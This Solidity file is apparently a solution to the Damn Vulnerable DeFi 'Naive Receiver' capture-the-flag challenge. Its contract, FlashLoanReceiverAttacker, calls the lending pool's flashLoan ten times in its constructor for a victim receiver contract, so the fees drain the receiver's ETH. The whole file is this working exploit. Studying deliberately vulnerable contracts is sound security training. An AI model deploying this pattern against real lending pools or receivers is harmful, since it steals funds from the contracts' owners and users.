// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

/**
 * @title FlashLoanReceiver
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract FlashLoanReceiverAttacker {

    NaiveReceiverLenderPool public p;
    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    constructor(address payable _pool, address _receiver) {
        p = NaiveReceiverLenderPool(_pool);
        for (uint256 i = 0; i < 10; i++) {
            p.flashLoan(IERC3156FlashBorrower(_receiver), ETH, 0, "");
        }
    }

}